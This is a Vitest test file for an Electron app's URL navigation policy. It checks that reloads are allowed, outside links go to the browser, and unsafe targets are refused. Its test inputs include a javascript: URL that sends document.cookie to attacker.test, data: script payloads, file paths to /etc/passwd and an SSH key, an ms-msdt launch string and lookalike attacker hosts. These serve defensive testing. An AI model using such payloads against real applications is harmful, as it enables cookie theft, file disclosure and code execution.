import { describe, expect, it, vi } from "vitest";
import {
	attachNavigationPolicy,
	decideNavigation,
	type NavigablePreventable,
	type NavigationVerdict,
	normalizeExternalUrl,
} from "./navigationPolicy";

const DEV_EDITOR = "http://localhost:5173/?windowType=editor";
const PACKAGED_EDITOR =
	"file:///Applications/OpenScreen.app/Contents/dist/index.html?windowType=editor";

function verdict(trustedUrl: string | null, targetUrl: string): NavigationVerdict {
	return decideNavigation({ trustedUrl, targetUrl, platform: "darwin" });
}

describe("decideNavigation", () => {
	const cases: ReadonlyArray<{
		name: string;
		trusted: string | null;
		target: string;
		expected: NavigationVerdict;
	}> = [
		{
			name: "reloading the dev editor document is allowed",
			trusted: DEV_EDITOR,
			target: DEV_EDITOR,
			expected: { action: "allow" },
		},
		{
			name: "reloading the packaged editor document is allowed",
			trusted: PACKAGED_EDITOR,
			target: PACKAGED_EDITOR,
			expected: { action: "allow" },
		},
		{
			name: "a hash on the trusted document is still the trusted document",
			trusted: DEV_EDITOR,
			target: `${DEV_EDITOR}#timeline`,
			expected: { action: "allow" },
		},
		{
			name: "a replaceState-style path on the trusted origin is blocked",
			trusted: DEV_EDITOR,
			target: "http://localhost:5173/index.html?windowType=editor",
			expected: { action: "deny", reason: "trusted-origin-other-document" },
		},
		{
			name: "the editor may not reload itself as the recorder HUD",
			trusted: DEV_EDITOR,
			target: "http://localhost:5173/?windowType=hud-overlay",
			expected: { action: "deny", reason: "trusted-origin-other-document" },
		},
		{
			name: "another port on the trusted host is not the trusted document",
			trusted: DEV_EDITOR,
			target: "http://localhost:9999/?windowType=editor",
			expected: { action: "deny", reason: "trusted-origin-other-document" },
		},
		{
			name: "https on the trusted host is not the trusted document",
			trusted: DEV_EDITOR,
			target: "https://localhost:5173/?windowType=editor",
			expected: { action: "deny", reason: "trusted-origin-other-document" },
		},
		{
			name: "javascript: is blocked",
			trusted: DEV_EDITOR,
			target: 'javascript:fetch("http://attacker.test/"+document.cookie)',
			expected: { action: "deny", reason: "unsupported-scheme" },
		},
		{
			name: "javascript: is blocked in a packaged window too",
			trusted: PACKAGED_EDITOR,
			target: "javascript:alert(1)",
			expected: { action: "deny", reason: "unsupported-scheme" },
		},
		{
			name: "data: documents are blocked",
			trusted: DEV_EDITOR,
			target: "data:text/html,<script>alert(1)</script>",
			expected: { action: "deny", reason: "unsupported-scheme" },
		},
		{
			name: "about:blank is blocked",
			trusted: DEV_EDITOR,
			target: "about:blank",
			expected: { action: "deny", reason: "unsupported-scheme" },
		},
		{
			name: "a subresource scheme is never a document",
			trusted: PACKAGED_EDITOR,
			target: "blob:file:///0f0f0f0f-0000-4000-8000-000000000000",
			expected: { action: "deny", reason: "unsupported-scheme" },
		},
		{
			name: "a file outside the app document is blocked in development",
			trusted: DEV_EDITOR,
			target: "file:///etc/passwd",
			expected: { action: "deny", reason: "trusted-origin-other-document" },
		},
		{
			name: "a file outside the app document is blocked when packaged",
			trusted: PACKAGED_EDITOR,
			target: "file:///Users/me/.ssh/id_ed25519",
			expected: { action: "deny", reason: "trusted-origin-other-document" },
		},
		{
			name: "a lookalike host is rejected rather than opened in a browser",
			trusted: DEV_EDITOR,
			target: "https://localhost.attacker.test/?windowType=editor",
			expected: { action: "deny", reason: "lookalike-host" },
		},
		{
			name: "a host the trusted host is a suffix of is rejected",
			trusted: "https://openscreen.example.com/app?windowType=editor",
			target: "https://openscreen.example.com.attacker.test/app?windowType=editor",
			expected: { action: "deny", reason: "lookalike-host" },
		},
		{
			name: "embedded credentials are refused before anything else",
			trusted: DEV_EDITOR,
			target: "http://user:pw@example.com/",
			expected: { action: "deny", reason: "embedded-credentials" },
		},
		{
			name: "credentials are refused even on the trusted origin",
			trusted: DEV_EDITOR,
			target: "http://user:pw@localhost:5173/?windowType=editor",
			expected: { action: "deny", reason: "embedded-credentials" },
		},
		{
			name: "an ordinary https link is handed to the browser",
			trusted: DEV_EDITOR,
			target: "https://example.com/",
			expected: { action: "external", url: "https://example.com/", reason: "externalised" },
		},
		{
			name: "a docs link from a packaged window is handed to the browser",
			trusted: PACKAGED_EDITOR,
			target: "https://github.com/openscreen/openscreen/issues",
			expected: {
				action: "external",
				url: "https://github.com/openscreen/openscreen/issues",
				reason: "externalised",
			},
		},
		{
			name: "mailto is handed to the browser from a packaged window",
			trusted: PACKAGED_EDITOR,
			target: "mailto:someone@example.com",
			expected: {
				action: "external",
				url: "mailto:someone@example.com",
				reason: "externalised",
			},
		},
		{
			name: "an unparsable target is refused",
			trusted: DEV_EDITOR,
			target: "not a url",
			expected: { action: "deny", reason: "unparsable-target" },
		},
		{
			name: "nothing is allowed before the window has committed a document",
			trusted: null,
			target: DEV_EDITOR,
			expected: { action: "deny", reason: "no-trusted-document" },
		},
	];

	for (const testCase of cases) {
		it(testCase.name, () => {
			expect(verdict(testCase.trusted, testCase.target)).toEqual(testCase.expected);
		});
	}

	it("compares packaged paths case-insensitively on Windows only", () => {
		const trusted = "file:///C:/Program%20Files/OpenScreen/dist/index.html?windowType=editor";
		const target = "file:///c:/program%20files/openscreen/dist/index.html?windowType=editor";

		expect(decideNavigation({ trustedUrl: trusted, targetUrl: target, platform: "win32" })).toEqual(
			{
				action: "allow",
			},
		);
		expect(decideNavigation({ trustedUrl: trusted, targetUrl: target, platform: "linux" })).toEqual(
			{
				action: "deny",
				reason: "trusted-origin-other-document",
			},
		);
	});

	it("leaves DevTools to itself", () => {
		const devtools = "devtools://devtools/bundled/devtools_app.html";
		expect(verdict(devtools, `${devtools}?remoteBase=x`)).toEqual({ action: "allow" });
		expect(verdict(devtools, "https://example.com/")).toEqual({
			action: "deny",
			reason: "unsupported-scheme",
		});
	});
});

describe("normalizeExternalUrl", () => {
	it("accepts the protocols the renderer is allowed to open", () => {
		expect(normalizeExternalUrl("https://openscreen.studio/")).toBe("https://openscreen.studio/");
		expect(normalizeExternalUrl("http://localhost:1234/docs")).toBe("http://localhost:1234/docs");
		expect(normalizeExternalUrl("  mailto:a@b.test  ")).toBe("mailto:a@b.test");
	});

	it("refuses launch primitives and junk", () => {
		// `shell.openExternal` hands these to the OS handler, so they are not links.
		expect(normalizeExternalUrl("file:///etc/passwd")).toBeNull();
		expect(normalizeExternalUrl("ms-msdt:/id PCWDiagnostic")).toBeNull();
		expect(
			normalizeExternalUrl("x-apple.systempreferences:com.apple.preference.security"),
		).toBeNull();
		expect(normalizeExternalUrl("javascript:alert(1)")).toBeNull();
		expect(normalizeExternalUrl("not a url")).toBeNull();
		expect(normalizeExternalUrl("")).toBeNull();
		expect(normalizeExternalUrl(undefined)).toBeNull();
		expect(normalizeExternalUrl(42)).toBeNull();
	});
});

function fakeContents(initialUrl: string) {
	const listeners = new Map<string, (event: unknown, url: string) => void>();
	let windowOpenHandler: ((details: { url: string }) => { action: "deny" }) | null = null;
	return {
		contents: {
			getURL: () => initialUrl,
			on(event: string, listener: (event: never, url: string) => void) {
				listeners.set(event, listener as (event: unknown, url: string) => void);
				return this;
			},
			setWindowOpenHandler(handler: (details: { url: string }) => { action: "deny" }) {
				windowOpenHandler = handler;
			},
		},
		emit(event: string, url: string): NavigablePreventable & { prevented: boolean } {
			const prevented = {
				prevented: false,
				preventDefault(): void {
					prevented.prevented = true;
				},
			};
			listeners.get(event)?.(prevented, url);
			return prevented;
		},
		openWindow(url: string) {
			return windowOpenHandler?.({ url });
		},
	};
}

describe("attachNavigationPolicy", () => {
	const hooks = () => ({
		openExternal: vi.fn(() => Promise.resolve()),
		onTrustedDocument: vi.fn(),
		log: { warn: vi.fn() },
		platform: "darwin" as const,
	});

	it("lets a reload through on will-navigate", () => {
		const fake = fakeContents(DEV_EDITOR);
		const spies = hooks();
		attachNavigationPolicy(fake.contents, spies);

		expect(fake.emit("will-navigate", DEV_EDITOR).prevented).toBe(false);
		expect(spies.openExternal).not.toHaveBeenCalled();
	});

	it("prevents a navigation away from the trusted document", () => {
		const fake = fakeContents(DEV_EDITOR);
		const spies = hooks();
		attachNavigationPolicy(fake.contents, spies);

		expect(
			fake.emit("will-navigate", "http://localhost:5173/?windowType=hud-overlay").prevented,
		).toBe(true);
		expect(spies.log.warn).toHaveBeenCalled();
	});

	it("prevents a redirect to an external site and opens it in the browser instead", () => {
		const fake = fakeContents(DEV_EDITOR);
		const spies = hooks();
		attachNavigationPolicy(fake.contents, spies);

		expect(fake.emit("will-redirect", "https://example.com/").prevented).toBe(true);
		expect(spies.openExternal).toHaveBeenCalledWith("https://example.com/");
	});

	it("never opens a second Electron window and externalises allowlisted URLs", () => {
		const fake = fakeContents(DEV_EDITOR);
		const spies = hooks();
		attachNavigationPolicy(fake.contents, spies);

		expect(fake.openWindow("https://github.com/openscreen/openscreen")).toEqual({
			action: "deny",
		});
		expect(spies.openExternal).toHaveBeenCalledWith("https://github.com/openscreen/openscreen");

		expect(fake.openWindow("javascript:alert(1)")).toEqual({ action: "deny" });
		expect(spies.openExternal).toHaveBeenCalledTimes(1);
	});

	it("follows the document the main process commits, not one the page announces", () => {
		const fake = fakeContents("");
		const spies = hooks();
		attachNavigationPolicy(fake.contents, spies);

		// Before the first commit nothing is trusted.
		expect(fake.emit("will-navigate", DEV_EDITOR).prevented).toBe(true);

		fake.emit("did-navigate", DEV_EDITOR);
		expect(fake.emit("will-navigate", DEV_EDITOR).prevented).toBe(false);
		expect(
			fake.emit("will-navigate", "http://localhost:5173/?windowType=hud-overlay").prevented,
		).toBe(true);
	});

	it("reports each committed document so the permission policy can key on it", () => {
		const fake = fakeContents("");
		const spies = hooks();
		attachNavigationPolicy(fake.contents, spies);

		expect(spies.onTrustedDocument).not.toHaveBeenCalled();
		fake.emit("did-navigate", DEV_EDITOR);
		expect(spies.onTrustedDocument).toHaveBeenCalledWith(DEV_EDITOR);
	});
});
